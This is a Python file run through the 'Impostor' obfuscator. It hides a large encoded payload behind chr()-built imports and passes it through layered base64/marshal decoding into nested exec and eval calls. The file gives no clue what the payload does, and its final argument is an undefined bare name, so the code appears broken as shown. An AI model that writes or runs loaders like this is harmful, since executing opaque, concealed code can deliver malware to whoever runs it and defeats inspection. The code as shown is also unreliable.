__author__ = 'BlueRed_'
__madeBy__ = 'Impostor'
__git__ = 'https://github.com/CSM-BlueRed/Impostor'

# Obfuscated with Impostor

class Gateway():
  def __init__(self, way: bytes, key: int, **ext) -> None: self.way = way;self.key = key; self.module__ = ext.get('__module', None);self.__globals = ext.get('__globals', None);self.__module = ext.get('__module', None); self.__interpreter = ext.get('interpreter', None)
  def Pass(self): exec(eval(eval('chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(109)+chr(97)+chr(114)+chr(115)+chr(104)+chr(97)+chr(108)+chr(34)+chr(41)')).loads(self.module__.b16decode(self.way)), {'__selfObject__': self, '__key__': self.key, '__module': self.module__, '__globals': self.__globals, '__InterpreterObject__': self.__interpreter}); return self
class Interpreter():
  def __init__(self, code: str, layersFunction: bytes, module, globals_, backend: bytes = b'') -> None: self.__module = module;self.layersFunction = layersFunction;self.__globals = globals_;self.code = {'bytes': code, 'str': str(code)}; self.__backend = backend
  def __tunnel(self) -> Gateway: return Gateway(self.__backend, 9438, __module = self.__module, __globals = self.__globals, interpreter = self)
  def Run(self) -> None: decoder = self.__getobject__(); gate = self.__tunnel().Pass();exec(eval(eval(eval('chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(109)+chr(97)+chr(114)+chr(115)+chr(104)+chr(97)+chr(108)+chr(34)+chr(41)')).loads(decoder), {'__selfObject__': self, '__module': self.__module, '__sr_m': eval(eval('chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(109)+chr(97)+chr(114)+chr(115)+chr(104)+chr(97)+chr(108)+chr(34)+chr(41)')), '__globals': self.__globals, 'gate': gate}), self.__globals)
  def __getobject__(self) -> object: func = self.layersFunction; return self.__module.b64decode(func)

Interpreter(b'QZZ~{Rz*fmQEWy?QC4h4QB^TRRaIm{S5;C%R8>k+QZPnZQbk5iQEWy?QC4h4QB^TRRaIm{S5;C%R8>k+QZPnZQbk5iQEWy?S5|CAQB^TRRaIm{S5;C<R8>k+QZPnZQbk5iQEWy?PDXH5QZO+?RaIn0S5;C%R8>k+QZZ|JRz*fmQEY5TR90+7QC3DvRaIm{S5{I^RBK97QZPzFRz*%uQEW;`S5!(xQB^TZRxoTzS5;C*RBUimQ$<C3Rz)#SQ*1^^QB+bzQZO+?RaI<8S5;C%R8??TQZYtaQbkr$Q*25|QC4hKR8=)YRaIn8O)yqQR8>k;QhHKhQbtBkS8QZRR#t39QB^rZRz+k&S5;O-R8>k+QZQ9|QblY|QEXO9QdVqLQB^TZRxo5zS5;C>RBTQ}QZPngQbjpVRcvfXPDD;cQ!p_@RWM{)O>0s@RBUisQZO-EQbkTrRcu;FQC4t8R8=)YRaIz0PDN5kR8>k-QZQ9|Rz*fmQEX&LR#t39QdKomR#jv|PDWBvR90|OQZQCpRz*2ZQEWy?S5!(>QB^ThRxo5zS5;O-R4__aQZPnZRz*%vS8PT|QB+PvQ!p_@RWM{)O>0s@RaQz`QZO-EQbkTqQ*3BRQC4h4R8=)gRaIn4O)yeQR8>wzQ$<E$Rz*fmQ*25|PDX4+QB^flR%>KJS8GyERBK97Q&vSVQblA=QEW;`QdCY=QB^TRRxo5%S5;C*RBTFCQZPzHRz^lnS8PT|QdVqLR4_3^RaInKO>9y^R8~q@QZYtaQdKcfQEXC3QC4hKQ7|=ORaIm{O)yeSR8>k;QZZ|JQbkTqQEY5TR90+7Q7|z}S4Ct(S5;C@RBLcjQZQ?JQblY|Q*25}QC4tOQB^TZRcm7~S5;C%RBTFDQZPngQbjROQEW;`Q&dt#QZO+?RcmBMO)*kJR8>k?QZZIqQbkrzRcuyBQdV$PRaG%zRaIn0S5{I`R8>k+QZZ|JRz*fmRcvHPRaR_9Q!qJ0Rz+k&S5{I)RBUikQZPk&Qblx5QEW~~S5!(xQ7|<_S5;(AS5;C(R8??UQZPnZQbjROQ*1^^Q&dhxQ&llbRcmNMS8P&3R8??OQhHKaQbk5jRcu;FQC4t8R8=)YRcmBcPDN5kR8>k-QZQ9|Rz*fmQEX&LR#t39QdKomR#jw1O)yeYR90|OQZQCpRz*2ZQEWy?S5!(>QB^ThRxo5zS5{I`R4__aQZPnZRz*%vS8PT|QB+PvQ!p_@RWM{)O>0s_R4__fQZO-EQbkTqQ*3BRQC4h4R8=)gRaIn4O)yeQR8>wyQ$<E$Rz*fmQ*25|PDX4+QB^flR%>KJS8GyERBK97Q&v?lQblA=QEW;`QdCY=QB^TRRxo5%S5;C*RBTFCQZQ98QbtBjS8PT|QdVqLR4_3^RaInKO>9y^R8~q@QZYtaRz^-xQEXC3QC4hKQ7|=ORaIm{O)yeSR8>k<QZZ|JRz*fnQEX&LRaR_PQ7}0}Rz+k&S5{I^RaJ0OQZZUWRz*fmQEX&LS5!(>QB^c~QEOyIS5;C(RBTFCQZQOWQbjROQEW;|R8&qyQ&llcQdMX}Q7}?MR8&esQZPnZQbtBnQ*25|QC4h4R4_GDRaIm{O)*kPR4`6RQZZ|JRz*foQ*2~NRaR_PQ!qJ0Rz+k&S5{I&R8??NQZPk&Qblx5Q7}qKS5!(xQ87wWS5;(AS5;C(R8>k-QZPnZQbjROQ*1^`Q&dhxQ&lljRaInKO>0s{R8??TQZYthQbkrzRcvrbQC4hKRaG%zRaIn4S5;C(R8>k+QZZ|JQbkryS8Q5HR90+7QB^ThS8HTSO>0(4RaJ0OQ&m-YR#h=iQ!r#mS5|CQR4_G5S4Ct}O)yeYRBTR2QhHKhQblxARcu;HS8Gm2Q7|z>S5;(ES8GyERaS6WQZZF}Qblx6Q*2I1S5!(>R8=)YR%>iwQ7~3SR8>wxQZZUZQblxARcvHRRa8zzQ7|=AR#jwLO>9z1R8~q^Q$<yIR#h=iQ!r#oRcl67QB^rZR#j+5O)yqURBUikQZaBvQbjpVS8QlVRa8z!R8=)$RWNK*QC3nyRBUipQ&wwvR#h=iRcvTTS5#6}R4_F|R%>ipO>9<9RBB2?QZQ?JRz)#TQEX^PRa8z@Q&lx#RaIj!S8P&9RaJ0QQ&wzYQdKceRcvTTS5#6}R4_F|RxoHnO)*kTRBTFAQZR5tRz)#RS8QZTS5!_$Q&llkQZQsvS8P&DR90|SQ&vV{QdMkEQEW~~S8GaDR4_G5Rxo5%O>9y|RBTFDQZZ|JQbkr%RcuyCQdCYxQ&lx#RaInRQbkfwR90|VQZYq(QdKceS8Ps5PE|%#QB^ThRWM{uS8Gy2RcmlzQZY(JQbk5iQEWy?QC4h4QC3PzS8HTiS8Gy2R8>k+QZPnZQbk5nQ*3ZZS5!_#QB^TRRaIm{S5;C%RcmlzQhHH&Rz*fmQEWy?QC4h4QC3PzS8HQ1S8P&3R8>k+QZPnZQbk5nQ*3ZZS5|OUQB^TRRaIm{S5;C%RcmlzQZZ~=Rz*fmQEWy?QC4h4QC3PzS8HQ1O>0s@R8>k+QZPnZQbk5nQ*3ZZS5!(>QB^TRRaIm{S5;C%RcmlzQZZ|JQbk5iQEWy?QC4h4QC3PzS8HTSS5;C%R8>k+QZPnZQbk5nQ*3ZZPDD;sQB^TRRaIm{S5;C%RcmlzQZZ{VRz*fmQEWy?QC4h4QC3PzS8HTiPDN5eR8>k+QZPnZQbk5nQ*3ZZRa8<{QB^TRRaIm{S5;C%RcmlzQZaBuQbk5iQEWy?QC4h4QC3PzS8HQ1S5;C%R8>k+QZPnZQbk5nQ*3ZZS8Gy5QB^TRRaIm{S5;C%RcmlzQhHKhQbk5iQEWy?QC4h4QC3PsQEOyES8GyERcuOGQZO|{QdLe)QEW;`PDXG=R53<NRaInGO)*kTRBUioQZZ|KQbkr%QEXC4QC4t8RWLC_RcmZhQC3nyR4__dQZZF}QdM+MRcum7S8Gy5R8=)YRxoHrO)yqWRBTFFQhHWGRz+4&QEXO7Ra8z!R8=)pQfp*NO)*kXRBK99QZPk&Rz+-2S8Ps5PDD~wQdKcSS4Ct}O)yqYR8~q-QhHKhRz)#VRcvHQQdCYwQ&lljRaInCPDWBrRclIFQZPk&QdKceS8P&9PDDyYR8~q;S4Ct>S8Gy2RBTR2QZZ~{QbjRORcvTTR#Z+^QZO}BRz+l5S5{I`RBK9DQ$<yJQdKceRWMpeQ&wz6QdKcbQfp{NS5;C%R8>k+QZPnZQbk5iQEX^RQdCk^RWLPES8HTpQ7}?aR8>k?Q&wwwRz+4%S8P^DQ&wz6R4_49Rxo5%O)*kLRBUipQZZ|JRz*2ZS8QlVRa8z@QZO-7RaInKS5{I`R90|QQZPk&Rz+4%Rcu;FPDX51QC3DvS4Ct>S8P&5R90|QQZO-LRz+4$QEXC5RaS6CQB^fzRWM{)O>9z7R8??PQ&v@ZRz+k_Rcu;FPDXH5R4_4NRxoHrO)yqYRBTR1QZQ>UQbkr!Q*1^`QdVq6Q7|=AR#jwLS5{I`RBK9DQZQCwQbk5iO>0(2Q&wz6R4_49Rz+k+S8P&7R90|RQZR5tRz)#SS8QZRR#Z+^Q&lljS5;(6S8GyER4__eQZYq(Rz+-2S8PT|PDXH5QZYtLRWNK?S8G;IRBUimQZZ~=Rz*2aS8Ps7R#Z+!R4_GDS8HQ1O>0t4R4__eQZZF}QbkrzS8Q5HPDXH5R8=)gS4Ct>O)yeORBTR2QZaBuRz*2aQEX&LR#Z+#Q!q7QR#jw6Q87|ZR90|UQ&wwwQdMkDRWM{oPDXH5R8=`kS4C__O)yeKRBUimQZO)jRz+k`QEX01S5!_$QZO}CQZQs%O)*kVR4{N@Q&v`CQdMkES8P^DS8Gy5R8~e)Rxo5%O)yqWR8~$%QZaBuQbjRNQ*2~OQdCYxQ!p`9QZQpMS8P&FRBLcqQZQ?JRz)#SRcu;FPDXG=Q!z?YS4Ct>O)*kTRBTR1QZR5tRz*2ZQEX^QQdV$9QdKciS8HTTQ87|bRBK9DQZZF}Rz^loS8P^DQENt3R8=)gS4Cu6O)yeKRBTQ~QZQ>UQbjROQEX&LQdCY=Q&lxnRcmBQPDWBfRaJCGQ&m=4QbtBkQ!r#mR%=p4R8~q$Rxo5nO)yqURBTFDQZZUZQblxARWMdcQdVq5RaG@iQZQs!QbkfuRclIEQZQ9|QbtZsRWMpeR%=p4Q!z?YR#j|PS8GyKR8>wzQ&vhsRz*fnS8QZRPDD;dQZO}CQZQs%S8GyER8??TQ&li}Rz+k}Q7}qKQC4tOR8=)$Rxo5%O)*kRRclT|QZPngRz)#RS8QZSQB+P<QdUYtQEOyEO>0t4RcuOGQZPk&Qblx6RWMpgRcl67QC3DvR%>ipO>9<9RBTFNQZaBuQbjpVQEX&NS5!__QdKo!R#jwIQbkfsRcua1Q&m=4QblY}S8PT|S5|CQR4_F|RxoHoQ7~3SR8>k@QZZ~=Rz)#RRcvTTR8&q?QB^flRcm7~O>0t4R4`6PQ&m=4QbtBkQ!r#mR%=p4R8=)oRxoHrO)yqSRBTFDQZZUZQblxARWMdcQdVq5Q&lx#RWM{)O>9z5R8??TQZY(IQdLe)QEXaBS5#6}R8~q$S4Ct(O)*kTRBUioQ&vhsRz*fnQEX&LR#Z+^RaG@pS8HQ1O>0(4RaJ0OQZYq(Qblx6S8QxZS5!(>R8=r}QEO;MS5;C%RBUimQZR5rRz*fmQEWy?QC4h4QB^fzRWM{rQC3nyR8>k+QZPnZQbk5jS8Ps5QC4tOQB^TRRaIm{S5;C%RclT|QZPj@QblA^S8QZTRa8z!R8=)oR#js#O>9z5RaS6VQZZIxR#kLPQEW;`QC4h4QB^TRRaIm{O)*kPR8>k?QZPnZQbk5iQEWy?QEO60Q!p_@RaIn4S5;C%R8>k-QZQ^<QbkQUP*gBI',
            b'4wAAAAAAAAAAAAAAAAQAAAADAAAAQwAAAHN0AAAAdACDAGQBGQB9AHQAgwCgAWQCoQFzDWQAUwB0AIMAZAMZAH0BdACDAGQEGQB9AnwBagJkBRkAfQN8AqADfAOhAX0DfAKgBHwDoQF9A3wCoAV8A6EBfQN8AqAGfAOhAX0DdACDAGQGGQCgB3wDoQF9A3wDUwApB07aCV9fZ2xvYmFsc9oEZ2F0ZdoOX19zZWxmT2JqZWN0X1/aCF9fbW9kdWxl2gVieXRlc9oGX19zcl9tKQjaB2dsb2JhbHPaA2dldNoEY29kZdoJYjg1ZGVjb2Rl2gliNjRkZWNvZGXaCWIzMmRlY29kZdoJYjE2ZGVjb2Rl2gVsb2FkcykE2ghfZ2xvYmFsc9oDb2Jq2gZtb2R1bGVyCQAAAKkAchIAAAD6WEM6XFVzZXJzXEFtb3hsaW5cRGVza3RvcFxQeXRob24gU3R1ZmZcRW5jcnlwdGlvblxJbXBvc3Rvci1tYWluXEltcG9zdG9yLW1haW5caW1wb3N0b3IucHnaDFJlbW92ZUxheWVyczQAAABzFgAAAAoBEAEKAQoBCgEKAQoBCgEKARABBAE=',
            eval(eval('chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)+chr(34)+chr(41)')), globals(),
            b
).Run()